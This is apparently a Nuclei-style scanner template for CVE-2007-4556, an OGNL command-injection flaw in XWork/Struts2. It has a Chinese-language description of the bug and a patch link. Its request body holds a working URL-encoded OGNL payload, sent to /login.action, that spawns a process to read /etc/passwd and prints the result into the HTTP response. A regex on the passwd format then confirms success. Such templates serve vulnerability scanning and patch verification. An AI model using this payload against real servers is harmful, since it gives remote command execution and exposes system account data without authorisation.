id: CVE-2007-4556
info:
  name: OpenSymphony XWork/Apache Struts2 - Remote Code Execution
  author:
  - l0ne1y
  description: |
    XWork AltSyntax功能OGNL命令注入漏洞
    XWork是一个命令模式框架，用于支持Struts 2及其他应用。

    如果启用了altSyntax功能的话，XWork就允许向文本字符串中注入OGNL表达式并递归的处理。远程攻击者可以通过HTML文本字段提交字符串，并在其中包含OGNL表达式，如果表单验证失败的话就会执行该表达式。例如，如果以下表单要求phoneNumber字段为非空的话：

    ＜s：form action=\"editUser\"＞

    ＜s：textfield name=\"name\" /＞

    ＜s：textfield name=\"phoneNumber\" /＞

    ＜/s：form＞

    用户可以将phoneNumber字段保持为空来触发验证错误，然后在name字段填充\\%{1+1}，当向用户重新显示表单时name字段的值就会为2。
  severity: high
  remediation: |-
    官方修复方案：
    1、目前厂商已发布升级补丁以修复漏洞，补丁获取链接：
    https://xwork.dev.java.net/files/documents/709/62331/xwork-2.0.4-all.zip
requests:
- matchers:
  - type: regex
    part: body
    regex:
    - 'root:.*:0:0:'
  - type: status
    status:
    - 200
  matchers-condition: and
  path:
  - '{{BaseURL}}/login.action'
  method: POST
  body: |
    username=test&password=%25%7B%23a%3D%28new+java.lang.ProcessBuilder%28new+java.lang.String%5B%5D%7B%22cat%22%2C%22%2Fetc%2Fpasswd%22%7D%29%29.redirectErrorStream%28true%29.start%28%29%2C%23b%3D%23a.getInputStream%28%29%2C%23c%3Dnew+java.io.InputStreamReader%28%23b%29%2C%23d%3Dnew+java.io.BufferedReader%28%23c%29%2C%23e%3Dnew+char%5B50000%5D%2C%23d.read%28%23e%29%2C%23f%3D%23context.get%28%22com.opensymphony.xwork2.dispatcher.HttpServletResponse%22%29%2C%23f.getWriter%28%29.println%28new+java.lang.String%28%23e%29%29%2C%23f.getWriter%28%29.flush%28%29%2C%23f.getWriter%28%29.close%28%29%7D
  headers:
    Content-Type: application/x-www-form-urlencoded
